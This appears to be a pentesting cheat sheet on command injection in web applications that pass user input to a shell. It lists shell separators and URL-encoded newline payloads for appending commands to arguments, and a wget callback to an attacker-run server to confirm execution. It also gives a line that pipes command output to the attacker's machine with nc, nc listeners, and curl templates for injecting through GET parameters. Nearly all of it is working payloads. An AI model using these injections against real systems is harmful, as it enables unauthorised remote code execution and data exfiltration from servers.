# RCE

## RCE

When a script called from a web page performs operations directly on the server using a shell (cmd or bash) it is possible to append malicious code to the argument. The following strings can be used as effective separators between legit parameters and injected commands.

### Make argument executable

The given argument will be executed by the host instead of being threated as literal string

```php
`<cmd>`
$(<cmd>)
```

### Concatenate code to argument

Pass a standard argument and use one of the following strings to append a command that will be executed by the host.

```php
;
|
||
&
&&
';
"'
'"
%0a%0a
%0a%0d
%0a
%0d
%0a%0d
%0D
%0A
%0D%0A
%0d%0a
%0D%0a
%0d%0a
%250a
%250a%250d
%250a
%250a%250d
%25%30%44%a
%25%30%64%a
%25%30%41%a
%25%30%61%a
%25%30%44%25%30%41%a
%25%32%30%25%30%64%25%30%61%a
```

### Verify command execution

Start a HTTP server on your machine and make the remote host request a resource on your server. If you receive a GET request, the code injection was successful.

```php
python -m SimpleHTTPServer 80
junk%0D%0Awget%20<ip>/ok
```

### Send output

If it's not possible to read the output from the response, you can make the remote host connect back to you with nc and send the result to your machine.

```php
<command>|nc+<ip>+<port>
nc -nlvp <port>            #print output
nc -nlvp <port> > file     #send output to file
```

### Injection in parameters

```
curl http://<url>?<arg>=<cmd>    #GET
curl -G "http://<url>" --data-urlencode "<cmd>"    #GET encoded
```

When using url encoding with Windows paths the separators have to be escaped as \\\ for example `C:\\folder1\\folder2`

